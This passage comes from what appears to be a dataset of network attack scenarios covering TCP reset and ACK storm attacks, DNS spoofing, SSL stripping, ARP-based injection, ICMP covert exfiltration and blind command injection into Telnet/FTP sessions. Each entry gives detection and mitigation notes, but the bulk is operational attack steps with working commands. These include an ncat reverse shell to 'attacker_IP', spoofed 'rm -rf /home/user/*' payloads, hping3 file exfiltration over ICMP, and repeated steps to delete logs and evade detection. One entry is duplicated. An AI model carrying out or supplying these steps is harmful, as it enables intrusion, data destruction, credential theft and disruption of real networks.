Step 7: For stealth, use filters in Ettercap to only inject specific data based on context. Step 8: Save packet captures to verify successful command injection. Step 9: Close the session gracefully or launch cleanup commands.
Vulnerability: Predictable or exposed TCP sequence numbers
Impact: Session takeover, command injection, data theft
Detection Method: Monitor for abnormal SEQ/ACK mismatch or duplicate ACKs
Solution: Use encrypted protocols (SSH, HTTPS), sequence randomization, and IDS that detects forged ACKs

Title: TCP Reset Injection
Scenario Description: Attacker forcibly closes a TCP connection by sending a forged RST (reset) packet with correct sequence number, disrupting communications (DoS).
Attack Steps: Step 1: Use tcpdump or Wireshark to identify an active TCP session between two parties. Note down IPs, ports, and the sequence number of one side. Step 2: Craft a spoofed TCP packet using scapy or hping3 with a TCP RST flag, matching the expected sequence number of the targeted host. Step 3: For example, to target a download, sniff the HTTP connection and inject a RST with hping3 -R -s <client-port> -p <server-port> -a <client-ip> <server-ip>. Step 4: If the RST packet has a valid SEQ number, the receiving system will drop the connection instantly. Step 5: This causes denial of service or interrupts critical file transfers, SSH sessions, or web logins. Step 6: For automation, use tcpkill -i eth0 port 80 to continuously kill any session using port 80. Step 7: Validate in Wireshark that a RST packet was accepted and the connection closed. Step 8: Repeat or escalate by targeting both directions in a session to guarantee teardown.
Detection Method: Monitor for unexpected RST packets or excessive session resets
Solution: Enable TCP RST authentication (where supported), use encrypted sessions, firewall forged RST packets

Title: ACK Storm Attack
Scenario Description: Attacker triggers an endless ACK loop between two systems, causing bandwidth exhaustion or TCP/IP stack failure.
Attack Steps: Step 1: Identify two TCP-connected systems (e.g., via tcpdump or Wireshark) where you can spoof packets to both ends. Step 2: Inject a forged packet with incorrect flags (e.g., missing SYN/FIN) from A to B or B to A, causing confusion in the TCP state machine. Step 3: This malformed packet will cause the receiving end to respond with an ACK, which you then relay/spoof back to the sender as a valid ACK. Step 4: This causes both systems to continually send ACKs to each other in a loop, known as an ACK storm. Step 5: Use a script in scapy to automate ACK relaying with matching sequence/ACK numbers. Step 6: Monitor bandwidth consumption — the loop consumes CPU and network resources rapidly. Step 7: Eventually, it may exhaust buffers or crash lightweight IoT devices. Step 8: Stop the loop by sending FIN or RST packets to both ends using hping3 or a scapy script. Step 9: Clean up logs and monitor for re-triggering due to misconfigured NAT or firewall settings.
Vulnerability: TCP/IP stack behavior to invalid packet patterns
Detection Method: Watch for high ACK rate without data; anomalies in TCP flow
Solution: Harden TCP stack with ACK rate-limiting, deep packet inspection, or stateful firewalls with anomaly detection
Tags: TCP DoS, ACK Loop, Packet Storm

Title: DNS Spoofing (via Injection)
Scenario Description: Attacker races the legitimate DNS server by injecting a fake DNS response packet before the real one arrives, redirecting the victim to a malicious IP (MITM or phishing).
Attack Steps: Step 1: Ensure you are on the same LAN or can intercept DNS traffic (e.g., via Wi-Fi, shared network, or ARP spoofing). Step 2: Enable IP forwarding and packet injection (echo 1 > /proc/sys/net/ipv4/ip_forward). Step 3: Start ARP spoofing to position yourself as MITM using ettercap -T -q -M arp:remote /victim_IP/ /gateway_IP/ or Bettercap. Step 4: Use tcpdump or Bettercap’s net.sniff on to monitor DNS requests (usually port 53 UDP). Step 5: Run dnsspoof with a crafted host file (e.g., google.com 192.168.1.100) to inject spoofed responses: dnsspoof -i eth0 -f hosts.txt. Step 6: When the victim sends a DNS query, dnsspoof injects a response with a fake IP before the real DNS server replies. Step 7: The victim’s system accepts the fake IP and is redirected to attacker-controlled site. Step 8: Set up phishing page, malware download, or fake login on your spoofed server IP. Step 9: Confirm redirection in browser logs or tcpdump. Step 10: Cleanup by killing processes and resetting ARP using arp -d.
Vulnerability: Trust in first DNS reply without validation
Impact: Redirect to malicious websites; phishing; MITM
Detection Method: Monitor for unexpected DNS responses or duplicate DNS replies with different IPs
Solution: Use DNSSEC; force HTTPS-only mode; apply strict DNS over TLS/DoH

Title: HTML/JS Injection in HTTP Stream
Scenario Description: Attacker intercepts and modifies HTTP responses in transit, injecting malicious HTML or JavaScript to redirect, track, or exploit the victim.
Attack Steps: Step 1: Ensure you're on the same network as the victim (e.g., same Wi-Fi or LAN). Step 2: Enable IP forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward. Step 3: Launch ARP spoofing with ettercap -T -M arp:remote /victim_IP/ /gateway_IP/. Step 4: Use a filter script in Ettercap (or Bettercap module) to inject JavaScript. Example Etterfilter rule: if (ip.proto == TCP && tcp.dst == 80) { replace("</body>", "<script>alert('Hacked');</script></body>"); }. Step 5: Compile the filter with etterfilter inject_script.filter -o inject.ef and run ettercap -T -q -F inject.ef -M arp /victim_IP/ /gateway_IP/. Step 6: Visit any HTTP (not HTTPS) website from victim's device. The response HTML will now include your injected script. Step 7: You can inject a keylogger (js/keylogger.js), redirect (window.location), or load BeEF hook for full control. Step 8: Verify in browser console (F12) that injection succeeded. Step 9: Logs and captures (Wireshark) will confirm HTML alteration. Step 10: End attack and reset network state with arp -d and disable IP forwarding.
Vulnerability: Lack of encryption in HTTP; trust in content delivery
Impact: Script injection, credential theft, browser takeover
Detection Method: Detect modified HTML responses, audit JavaScript loads from unknown origins
Solution: Use HTTPS only (HSTS), disable HTTP access, use CSP headers
Tags: HTML Injection, HTTP MITM, JavaScript Phishing

Title: ARP Spoof + Packet Injection
Attack Type: Packet Injection with MITM via ARP Spoofing
Scenario Description: Attacker performs ARP spoofing to become MITM, then injects custom packets into the victim’s session (e.g., redirect, fake auth, or force download).
Attack Steps: Step 1: Connect to the same network as the target (e.g., same Wi-Fi). Step 2: Enable IP forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward. Step 3: Run ARP spoofing using ettercap -T -q -M arp:remote /victim_IP/ /gateway_IP/ or use Bettercap's net.probe on and net.recon on. Step 4: Once positioned as MITM, monitor traffic using Wireshark or Bettercap modules. Step 5: To inject a redirect, use Etterfilter to match HTTP requests and modify the response to point to a malicious site (e.g., fake update or phishing). Step 6: Alternatively, craft a raw packet using scapy: build a TCP packet with forged data (e.g., HTTP 302 redirect or file download trigger), and send it to victim’s port 80. Step 7: For example, inject: IP(dst="victim")/TCP(dport=80)/Raw("HTTP/1.1 302 Found..."). Step 8: This packet appears as a valid server reply and tricks the browser into following it. Step 9: Victim is redirected or executes unintended action. Step 10: Verify injection in victim's browser and traffic logs. Clean up after use with killall ettercap and flush ARP.
Vulnerability: Trust in LAN packets; unencrypted protocols
Detection Method: Analyze ARP tables, detect MAC conflicts, alert on duplicate ARP replies
Solution: Use encrypted protocols (HTTPS, SSH); implement DHCP snooping and dynamic ARP inspection (DAI) on switches

Title: Fragmentation Evasion
Attack Type: IP Packet Fragmentation to Bypass IDS/IPS
Scenario Description: Malicious payload is split into multiple small fragments, which reassemble at the destination, bypassing detection by intrusion systems that don’t reassemble properly.
Attack Steps: Step 1: Install fragroute or use scapy to craft fragmented IP packets. On Kali Linux: apt install fragroute. Step 2: Configure a rule in fragroute.conf like fragment 24 to split every payload into 24-byte IP fragments. Step 3: Use a tool like ncat or a reverse shell to generate a simple payload (e.g., reverse shell or malicious HTTP request). Example: ncat -e /bin/bash attacker_IP 4444. Step 4: Start fragroute with: fragroute -f fragroute.conf <target_IP> so all traffic to the victim is fragmented. Step 5: The IDS/IPS (e.g., Snort or Suricata) may fail to detect the malicious payload if it doesn’t properly reassemble fragments before inspection. Step 6: On the receiving side (victim), the OS reassembles the fragments and executes the payload. Step 7: Use Wireshark to monitor the traffic and confirm that fragments are visible, and full packets only exist after reassembly. Step 8: This can also bypass firewalls or WAFs that only check initial fragments. Step 9: After testing, stop fragroute and analyze logs for IDS/IPS evasion success.
Impact: IDS/IPS bypass, firewall evasion, covert delivery
Detection Method: Detect unusual fragmentation rates or small packet anomalies
Solution: Enable full stream reassembly in IDS/IPS (e.g., stream5 in Snort), limit small fragments, deep packet inspection

Title: SSL Strip + Inject
Scenario Description: Attacker forces HTTP instead of HTTPS, allowing injection of malicious content into web pages and harvesting credentials in transit.
Attack Steps: Step 1: Connect to the same LAN or Wi-Fi as the victim. Step 2: Enable IP forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward. Step 3: Start ARP spoofing with ettercap -T -q -M arp:remote /victim_IP/ /gateway_IP/ or bettercap -iface eth0. Step 4: Use iptables to redirect HTTPS (443) to local HTTP port: iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000. Step 5: Run sslstrip: sslstrip -l 10000. This will listen for HTTP and rewrite HTTPS links into HTTP transparently. Step 6: Victim browsing normally clicks an HTTPS link but is transparently downgraded to HTTP. Step 7: The attacker now sees all traffic in plaintext and can inject payloads like <script> tags, phishing forms, or redirect code using Ettercap filters or Bettercap's inject.js. Step 8: Monitor credentials entered into login pages, or include JavaScript that sends data to your server. Step 9: Watch sslstrip.log to capture usernames, passwords, and sessions. Step 10: When done, flush iptables and kill sslstrip.
Vulnerability: Trust in auto-upgraded HTTPS not enforced (no HSTS)
Detection Method: Monitor certificate mismatches; browser HSTS enforcement failures
Solution: Use HSTS headers, HTTPS-only enforcement, avoid public networks, inspect browser URL bar for HTTPS downgrade
Tags: SSL Strip, Credential Stealing, JS Injection

Title: ICMP Injection (Covert Channel)
Attack Type: Data Injection via ICMP Echo or Payload Abuse
Scenario Description: Attacker uses ICMP packets (e.g., ping) to covertly send data or receive commands from infected hosts without using standard protocols.
Attack Steps: Step 1: Use scapy to craft ICMP Echo Request packets that carry data inside the payload section: IP(dst="target")/ICMP()/Raw(load="secret_data"). Step 2: Send the packet using send() in scapy, or automate with a Python script. Step 3: On the victim side, have a passive ICMP listener (icmp-backdoor.py) that checks all ICMP requests for commands or payloads. Step 4: For bidirectional communication, encode command outputs into ICMP Echo Reply packets. Step 5: From a compromised machine, encode exfiltrated data (like credentials) into multiple ICMP packets to slowly leak info over time. Step 6: Use hping3 --icmp -d 100 -E secret.txt target_IP to send a file hidden in ICMP data section. Step 7: On receiver end, reassemble file from captured packets using tcpdump -i eth0 icmp -w icmp_out.pcap then parse with scapy. Step 8: This channel works well because many firewalls allow ping. Step 9: Monitor with Wireshark to see Echo Request with non-standard data. Step 10: Kill listener, delete logs, and erase packet captures.
Vulnerability: ICMP packets not inspected for content
Impact: Covert data exfiltration, command & control traffic
Detection Method: Analyze ICMP payloads for anomalies; alert on abnormal ping frequency or length
Solution: Deep packet inspection on ICMP, restrict ICMP egress traffic, use anomaly detection tools like Suricata
Tags: Covert Channel, ICMP Abuse, Data Exfiltration

Title: Routing Table Poisoning
Scenario Description: Attacker injects fake routing updates into LAN (e.g., via RIP, OSPF, or DHCP routes) to redirect traffic through attacker’s machine or sinkhole legitimate traffic.
Attack Steps: Step 1: Connect to a LAN where dynamic routing protocols (like RIP, OSPF) or DHCP-assigned static routes are in use. Step 2: Install yersinia: apt install yersinia. Launch in GUI or console: yersinia -G or yersinia -I. Step 3: Use Yersinia to inject rogue RIP packets (Module > RIP > Launch attack). Inject fake route advertisement saying "192.168.1.0/24 is reachable via attacker_IP". Step 4: Alternatively, use scapy to craft a RIP/OSPF packet: send(IP(dst="224.0.0.9")/UDP()/Raw(load="route info")). Step 5: Run Wireshark to confirm target system received new route advertisement. Step 6: Monitor system routing tables on victim (route -n or ip route) – your fake route appears. Step 7: Victim’s traffic to specific destinations now goes through the attacker's system. Use this for sniffing, redirection, or MITM. Step 8: Once done, restore original routing via ARP replies or DHCP refresh. Step 9: Remove injected routes and clear logs if needed.
Detection Method: Monitor for sudden routing table changes or unexpected route sources
Solution: Disable dynamic routing if not needed; enforce static routes; validate OSPF/RIP neighbors with auth

Title: VoIP Injection (RTP Stream)
Scenario Description: Attacker inserts fake audio (e.g., message, noise, commands) into ongoing VoIP RTP stream by spoofing packet structure and timing.
Attack Steps: Step 1: Connect to a LAN where VoIP is used (e.g., SIP-based call systems like Asterisk). Step 2: Use Wireshark or tcpdump to capture an ongoing VoIP call: filter on SIP and RTP ports (usually UDP 5060 for SIP, 16384+ for RTP). Step 3: Extract RTP stream and get codec used (e.g., G.711 µ-law). Step 4: Record a short audio clip (e.g., .ulaw format) that will be injected (e.g., “This call is monitored”). Step 5: Use rtpinject with RTP stream details: rtpinject -s <srcIP> -d <dstIP> -p <port> -f audio.ulaw -c ulaw -t <timestamp> to inject the audio into the call. Step 6: If you don’t have RTP details, sniff call initiation using SIP INVITE packets to identify IPs and ports. Step 7: The target party hears the inserted message during the call, without interruption. Step 8: Can be used to troll, insert misleading commands, or mimic supervisor voice. Step 9: Monitor RTP traffic using Wireshark to ensure injected packets appear between valid streams. Step 10: Clean up logs or revert to passive sniffing to avoid detection.
Vulnerability: Lack of encryption and RTP spoofing prevention
Impact: Voice spoofing, misinformation, confusion during calls
Detection Method: Monitor RTP stream anomalies, timestamps, and voice quality drops
Solution: Use SRTP (Secure RTP), enforce call authentication, use IDS signatures for RTP injection

Title: SSH Injection (Timing-Based)
Attack Type: Remote Keystroke Injection via Timing Analysis
Scenario Description: Exploits timing between SSH keystrokes (via sniffed packets) to infer or inject characters covertly in an open interactive session.
Tools Used: Wireshark, tcpdump, scapy, custom timing scripts
Attack Steps: Step 1: Begin sniffing SSH traffic between two machines using tcpdump -i eth0 tcp port 22 -w ssh.pcap. SSH payload is encrypted, but timing and size can still be analyzed. Step 2: Open ssh.pcap in Wireshark and filter with tcp.stream eq X. Observe packet timestamps for user key presses (each keystroke typically triggers a packet). Step 3: Export the timestamp pattern and analyze delays between keystrokes using Python or tshark: longer delays usually mean key boundaries (e.g., space, return). Step 4: Try to infer typed commands based on timing patterns and packet lengths (e.g., sudo, passwd, etc.). Step 5: To inject into a session, gain MITM via ARP spoofing. Use scapy to clone session sequence numbers: IP()/TCP(seq=..., ack=..., sport=22)/Raw("your_payload"). Step 6: Inject forged SSH packets that mimic legitimate keystrokes (requires correct TCP ACK/SEQ sync). Step 7: With precise timing, attacker can manipulate a command line session (e.g., alter sudo commands). Step 8: This attack is extremely sensitive and often used in high-skill targeted espionage. Step 9: Clean up by halting MITM and flushing any route or ARP changes.
MITRE Technique: T1056 – Input Capture via Traffic Timing
Detection Method: Detect out-of-sync TCP segments or timing anomalies
Solution: Enforce strict TCP validation, use encrypted metadata channels (like ssh -C), prevent MITM
Tags: SSH Injection, Timing Attack, Keystroke Manipulation

Title: Telnet/FTP Session Injection (Blind)
Attack Type: Command Injection into Plaintext TCP Stream
Scenario Description: Attacker injects commands into an ongoing Telnet/FTP session by sniffing sequence numbers and blindly spoofing a TCP packet that mimics the authenticated client.
Attack Steps: Step 1: Connect to the same network segment as the victim (e.g., via LAN or Wi-Fi) where unencrypted Telnet or FTP is in use. Step 2: Use Wireshark or tcpdump to capture TCP traffic. Apply filter: tcp.port == 23 (Telnet) or tcp.port == 21 (FTP). Step 3: Identify an active session between victim and server. From the captured traffic, note the source/destination IPs and ports, as well as the current TCP sequence and acknowledgment numbers. Step 4: Open scapy or use hping3 to manually craft a spoofed packet with the victim’s IP/port as source. Example with hping3: hping3 -c 1 -S -p 23 -s 1032 -a victim_IP --seq seq_number --ack ack_number --data "rm -rf /home/user/*" Step 5: Send the forged packet into the stream. If sequence/ack numbers are correctly guessed, the server accepts the injected command as if it came from the authenticated user. Step 6: You may not see the result (hence "blind"), but the command executes on the server. You can confirm by monitoring side effects (e.g., data deleted or echoed output). Step 7: Repeat with different commands or loop brute-force guessing if the session state is unknown. Step 8: For better accuracy, inject shortly after you see a legitimate command being sent, when timing is predictable. Step 9: Log out or disconnect after injection to avoid suspicion.
Vulnerability: Lack of encryption, predictable TCP behavior
MITRE Technique: T1056.001 – Input Capture via Network Sniffing
Impact: Remote execution of system-level or shell commands
Detection Method: Monitor for unexpected or malformed packets in session flow
Solution: Use SSH/SFTP instead of Telnet/FTP; enforce encrypted transport; block legacy ports
Tags: Telnet, FTP, Blind Injection, Command Injection

Title: Blind TCP Reset (RST Injection)
Attack Type: Forced TCP Termination via Spoofed RST Packet
Scenario Description: Attacker sends a forged TCP RST packet with correct parameters to silently terminate an active connection between victim and server, disrupting communication.
Attack Steps: Step 1: Monitor an active TCP connection using tcpdump or Wireshark. Apply filter: tcp to view connections like HTTP, FTP, SSH, etc. Step 2: Identify 4-tuple: Source IP, Destination IP, Source Port, and Destination Port of the active TCP stream. Also, capture the current sequence number of the client or server. Step 3: In Wireshark, locate a recent TCP packet and right-click → Follow TCP Stream to get context. Note the SEQ number. Step 4: Open hping3 (or scapy) and craft a packet with the same 4-tuple but with the RST flag set. Example: hping3 -R -s <src_port> -a <src_ip> -p <dst_port> <dst_ip> --seq <captured_seq> Step 5: Send the spoofed RST packet. If SEQ number is within an acceptable range, the TCP session will immediately be terminated by one or both endpoints. Step 6: The users on either end may simply think the network dropped. No alerts are triggered unless traffic logs are analyzed. Step 7: Can be used to cut SSH, FTP, web, or VoIP calls silently and repeatedly. Step 8: Test multiple RSTs with adjusted SEQ numbers if you don't know the exact current value. Step 9: Once done, clear local logs and Wireshark captures.
Vulnerability: No session validation, unencrypted TCP state info
MITRE Technique: T1498 – Service Stop / DoS via Protocol Abuse
Impact: Silent termination of sessions or denial of service
Detection Method: Monitor for unexpected RST packets from unauthenticated hosts
Solution: Enforce TCP RST validation (RFC-compliant stacks), use TLS/SSL encryption for secure sessions
Tags: TCP RST, Session Reset, Blind DoS, Protocol Injection

Title: Blind Command Injection
Scenario Description: Attacker blindly injects system-level commands into a plaintext protocol session (like Telnet or FTP) by spoofing TCP packets that mimic authenticated client input.
Attack Steps: Step 1: Join the same network as the victim (e.g., LAN or Wi-Fi). Ensure Telnet (TCP port 23) or FTP (TCP port 21) is being used between the client and server. Step 2: Start packet capture using Wireshark or tcpdump. Filter traffic with tcp.port == 23 (Telnet) or tcp.port == 21 (FTP). Step 3: Identify the TCP stream. In Wireshark, right-click → “Follow TCP Stream” to observe the ongoing session. You will see plaintext commands (like ls, cd, rm, ftp login, etc.). Step 4: Note key values: source IP, destination IP, source port, destination port, and TCP sequence number. Step 5: Open a terminal and use hping3 to spoof a command. For example: hping3 -c 1 -S -p 23 -s 1025 -a victim_ip --seq 123456789 --ack 987654321 --data "rm -rf /home/user/*" (Replace with real values). Step 6: You are injecting a packet directly into the stream. If your SEQ/ACK numbers are close enough to real ones, the server executes your spoofed command believing it's from the client. Step 7: You will not see the output (hence "blind"), but you can observe the effect (e.g., files deleted). Step 8: Use harmless test commands first like echo pwned > /tmp/test.txt to validate success. Step 9: Repeat with refined timing and updated sequence numbers if the command doesn’t land. Optionally use scapy to gain more flexibility crafting your own packets with exact SEQ/ACK. Step 10: This technique is highly effective against plaintext remote shells, especially where ARP spoofing or passive sniffing is already in place. Step 11: Clean up sniffing logs and monitor the session until the connection is closed.
Vulnerability: Lack of encryption and sequence validation
Detection Method: Watch for malformed or out-of-sequence TCP packets from rogue hosts
Solution: Enforce SSH/SFTP; monitor sequence anomalies; use TLS tunnels even for FTP
Tags: Blind Injection, Telnet, FTP, Command Spoofing

Title: Web Session Corruption via Desync
Scenario Description: Attacker sends malformed HTTP requests to break or desynchronize the web server and frontend (e.g., proxy or browser), allowing session takeover or code injection.
Tools Used: Burp Suite, curl, Postman, custom scripts
Attack Steps:
Step 1: Identify a target web application that uses reverse proxies (like NGINX, Apache) with backend apps (e.g., Flask, Node.js). These may mishandle headers. Step 2: Open Burp Suite and intercept HTTP requests. Try injecting conflicting headers like both Content-Length and Transfer-Encoding: chunked. Step 3: Craft malformed requests like: POST / HTTP/1.1
Host: target.com
Content-Length: 5
Transfer-Encoding: chunked

0

GARBAGE — The frontend parses Content-Length and backend parses Transfer-Encoding, causing desync. Step 4: Insert a malicious payload as a second request that the backend thinks belongs to a real user. This may include fake cookies, JavaScript injection (<script>alert('pwned')</script>), or a poisoned response. Step 5: When a real user visits, their session may get injected with the response or script intended for someone else, leading to session corruption, cookie theft, or phishing UI. Step 6: Validate if session misalignment occurs by visiting pages in another browser and seeing manipulated behavior (e.g., auto-login as wrong user or pop-ups). Step 7: Record all request timings and test variations with different proxy setups. This works best when frontend and backend parse HTTP slightly differently. Step 8: Can also be done with curl for custom headers or by replaying with Postman.
Vulnerability: HTTP header parsing mismatch between components
Detection Method: Monitor malformed headers, scan for desync behavior via HTTP request smuggling scanners
Solution: Normalize header parsing logic; reject mixed headers (CL + TE); apply strict input validation
Tags: HTTP Desync, Session Poisoning, Request Smuggling

Title: TCP ACK Storm Trigger
Scenario Description: Attacker creates a feedback loop between two TCP endpoints by forging ACK packets, resulting in an infinite ACK storm that overloads the systems or network.
Tools Used: scapy, hping3, Wireshark, custom Python TCP tools
Attack Steps: Step 1: Identify two TCP-connected systems (e.g., client-server or peer-to-peer) on the same subnet or where you have MITM/sniffing access. Step 2: Observe an active TCP connection using Wireshark (filter: tcp). Record source and destination IPs, ports, and sequence numbers. Step 3: Use scapy to spoof a TCP ACK packet pretending to come from the server to the client, and vice versa. Example in scapy: send(IP(src="client_ip", dst="server_ip")/TCP(sport=12345, dport=80, flags="A", ack=x, seq=y)). Step 4: The recipient believes the ACK is legitimate and replies with another ACK, which gets spoofed again by the attacker — forming an endless ACK loop. Step 5: Automate this loop using a Python script or use hping3 in --flood mode to send spoofed ACKs rapidly: hping3 -A -a client_ip server_ip -p 80 --flood. Step 6: Observe traffic spikes in Wireshark or router logs. The loop overwhelms the bandwidth and CPU as both systems endlessly ACK each other. Step 7: Can bring down low-powered servers or routers. Step 8: Cleanup: stop the loop from your end or reset the router if things get unresponsive. Step 9: Works best in LAN, especially on old or unprotected switches.
Vulnerability: Lack of stateful TCP validation in ACK handling
MITRE Technique: T1498 – Service DoS via Network Flooding
Detection Method: Monitor ACK spikes, abnormal TCP behavior patterns
Solution: Enforce strict TCP connection tracking; rate-limit ACKs; use IDS like Suricata to block anomalies
Tags: TCP Flood, ACK Loop, DoS, Network Exploit

Title: Trust Exploitation (IP Spoofing)
Scenario Description: Attacker spoofs the source IP of a trusted internal host (e.g., database, whitelisted IP) to gain unauthorized access to services that rely only on IP trust.
Attack Steps: Step 1: Discover a service (e.g., MySQL, SSH, API) that allows access based on IP (e.g., allow 10.0.0.5 in firewall or service config). Step 2: Confirm your current IP cannot access the service (test via telnet IP port). Step 3: Craft a spoofed packet using hping3 with the source IP set to the trusted address (e.g., 10.0.0.5): hping3 -S -p 3306 -a 10.0.0.5 target_ip — This sends a TCP SYN pretending to be from the trusted IP. Step 4: If the service accepts packets based solely on source IP (common in legacy firewalls), the server responds to 10.0.0.5, not you. This means no TCP handshake, so you cannot see the reply. Step 5: To overcome this, launch a one-way exploit, like UDP-based DNS injection or TCP-based blind injection (e.g., injecting SQL in login request or HTTP GET). Step 6: Alternatively, combine this with ARP spoofing to redirect replies from the trusted IP to your device. Step 7: If successful, server grants access or executes payload thinking you're the trusted host. Step 8: Works best inside internal networks or poorly segmented VLANs.
Vulnerability: Relying on IP address as the only trust mechanism
Detection Method: Monitor spoofed traffic, analyze source IP frequency from edge firewall logs
Solution: Avoid IP-based trust; use certificate-based mutual auth, MAC validation, and device-level policies
Tags: IP Spoofing, Trust Exploit, Network Auth Bypass

Step 2: Confirm your current IP cannot access the service (test via telnet IP port). Step 3: Craft a spoofed packet using hping3 with the source IP set to the trusted address (e.g., 10.0.0.5): hping3 -S -p 3306 -a 10.0.0.5 target_ip — This sends a TCP SYN pretending to be from the trusted IP. Step 4: If the service accepts packets based solely on source IP (common in legacy firewalls), the server responds to 10.0.0.5, not you. This means no TCP handshake, so you cannot see the reply. Step 5: To overcome this, launch a one-way exploit, like UDP-based DNS injection or TCP-based blind injection (e.g., injecting SQL in login request or HTTP GET). Step 6: Alternatively, combine this with ARP spoofing to redirect replies from the trusted IP to your device. Step 7: If successful, server grants access or executes payload thinking you're the trusted host. Step 8: Works best inside internal networks or poorly segmented VLANs.
Vulnerability: Relying on IP address as the only trust mechanism
Detection Method: Monitor spoofed traffic, analyze source IP frequency from edge firewall logs
Solution: Avoid IP-based trust; use certificate-based mutual auth, MAC validation, and device-level policies
Tags: IP Spoofing, Trust Exploit, Network Auth Bypass

Title: Fake ACK + Data Injection
Scenario Description: Attacker crafts fake TCP ACK packets and embeds malicious payloads to inject unauthorized data into an existing TCP connection.
Attack Steps:
Step 1: Monitor an active TCP session using Wireshark (e.g., between client and web server). Filter using tcp.stream eq X or ip.addr==target_ip. Step 2: Note IPs, source/destination ports, and especially TCP sequence and acknowledgment numbers (SEQ/ACK). You’ll use this to spoof a valid-looking packet. Step 3: Open scapy in Python. Craft a TCP packet where the source IP/port match the client, and destination IP/port match the server. Example: IP(src='victim_ip', dst='server_ip')/TCP(sport=12345, dport=80, seq=SEQ, ack=ACK, flags='PA')/"GET /malicious.txt HTTP/1.1
Host: vulnerable.site

" Step 4: If SEQ/ACK are accurate, the server accepts your packet as part of the stream. If successful, you inject commands, scripts, or fake data silently. Step 5: For binary protocols (e.g., FTP, SMTP), adapt your payload (e.g., "USER attacker
"). Step 6: Watch the server’s response — it goes to the legitimate client, not you. This is why it's "blind": you don’t get a reply, but the action occurs. Step 7: Use this to send commands, tamper transactions, or poison file transfers. Works well in LAN or after ARP spoofing. Step 8: Repeat with varied SEQ numbers if initial injection fails. Use tcpdump to analyze success or failure indirectly.
Vulnerability: Lack of message authentication, plaintext TCP
Detection Method: Look for TCP packets with mismatched timing or SEQ numbers
Solution: Use TLS (SSL) to protect TCP streams; enable strict TCP validation and replay detection
Tags: ACK Injection, TCP Spoof, Data Poisoning

Title: ACK Storm Trigger
Scenario Description: Malicious ACKs cause two systems to endlessly respond with TCP ACK packets, flooding the network and consuming resources.
Attack Steps: Step 1: Identify two TCP-connected systems (like client/server or two peers). Capture the ongoing TCP handshake using Wireshark. Step 2: Note the SEQ/ACK numbers from both sides of the connection. For example, Host A is at 10.0.0.1, Host B is 10.0.0.2, port 80. Step 3: Using scapy, spoof an ACK from Host A to Host B: send(IP(src="10.0.0.1", dst="10.0.0.2")/TCP(sport=12345, dport=80, flags="A", ack=x, seq=y)). Step 4: Then spoof the reverse ACK from Host B to Host A. Each host replies to the other with a real ACK. Step 5: The spoofed loop continues until systems are overwhelmed or firewalls intervene. Use hping3 --flood for rapid testing: hping3 -A -a 10.0.0.1 10.0.0.2 --flood. Step 6: Monitor in Wireshark for rapidly rising ACK-only traffic. Can crash routers or systems with low memory. Step 7: Works best on LANs with permissive switches. Step 8: Stop the storm manually or reboot devices to break the loop.
Detection Method: Detect rapid ACK packets between fixed IP/port pairs
Solution: Use firewalls that verify connection states; limit ACKs per second; isolate known ACK storm patterns

Title: TCP Desync Attack
Scenario Description: Attacker forces TCP endpoints out of sync by sending carefully crafted TCP packets with mismatched SEQ/ACK numbers, causing errors or injected content.
Attack Steps: Step 1: Find a TCP session between victim and service (e.g., HTTP over port 80). Use Wireshark to follow stream. Step 2: Record ongoing SEQ and ACK numbers. Note the server may send SEQ 1000, ACK 2000 → client responds with SEQ 2000, ACK 1001. Step 3: Inject your own packet using scapy or hping3 that uses a slightly incorrect SEQ or ACK (e.g., ACK 999, SEQ 1999) — just enough to be accepted but confusing. Step 4: Because the endpoints rely on these numbers for data order, they may fall out of sync, interpreting your injection as part of the stream. Step 5: In some cases, this causes a server or client to misplace input (e.g., execute a partial command), or create an error state (crash, timeout). Step 6: In HTTP, this may result in broken page loads or responses meant for one user being received by another — a primitive session hijack. Step 7: Can also break IDS/IPS systems that reconstruct streams differently from endpoints. Step 8: Real-world use includes bypassing firewall rules (e.g., server thinks request is invalid, but client processes it). Step 9: Best tested in labs or isolated networks due to risk of unintentional DoS. Step 10: Validate with packet diff tools or stream viewers.
Impact: Session misrouting, desync errors, hijack attempts
Detection Method: Analyze session logs for TCP retransmissions, incorrect SEQ/ACK combos
Solution: Normalize TCP handling across devices; validate full session integrity; use TLS
Tags: TCP Desync, Stream Injection, HTTP Smuggling

Title: HTTP Response Injection
Scenario Description: Attacker injects fake HTTP headers or HTML into a server's response, typically via proxy manipulation or packet injection, resulting in phishing or malware
Attack Steps:
Step 1: Ensure you are in a position to intercept or modify traffic (e.g., via ARP spoofing, MITM, or using a proxy like mitmproxy). You can practice this in a virtual lab. Step 2: Observe the HTTP response from a web server using Wireshark or mitmproxy. Identify a response like: HTTP/1.1 200 OK
Content-Type: text/html

<html>... Step 3: Use mitmproxy or Bettercap to modify or inject new headers or content. For example, inject a Set-Cookie header to steal sessions: Set-Cookie: sessionid=attacker or add JavaScript: <script>window.location='http://malicious.site'</script>. Step 4: Alternatively, use scapy to craft a forged TCP packet that matches the server’s ACK and SEQ, and insert the fake HTTP response. Example: IP(src='server', dst='client')/TCP(seq=xxx, ack=yyy, flags='PA')/"HTTP/1.1 200 OK...
<script>steal()</script>". Step 5: Ensure your injected SEQ/ACK are accurate so the browser accepts and renders the fake response. Step 6: This can display a fake login page, malware download link, or redirect silently. Step 7: Watch results in the victim's browser or logs. This method works only with plaintext HTTP — HTTPS prevents this unless SSL is stripped. Step 8: Test various injection styles (header-only, body-only, full-page replacement). Step 9: Clean up: remove spoofing rules and stop the proxy/sniffers.
Vulnerability: Lack of encryption or input/output sanitization
MITRE Technique: T1056.002 – Input Capture via HTML Injection
Detection Method: Monitor HTTP headers for tampering; alert on injected JS or abnormal headers
Solution: Enforce HTTPS with HSTS; block mixed content; use reverse proxies with CSP and content filters
Tags: HTTP Injection, Response Poisoning, Web MITM

Title: Telnet/FTP Command Injection
Scenario Description: Attacker spoofs ACK+data packets during Telnet/FTP sessions to inject shell commands or credentials
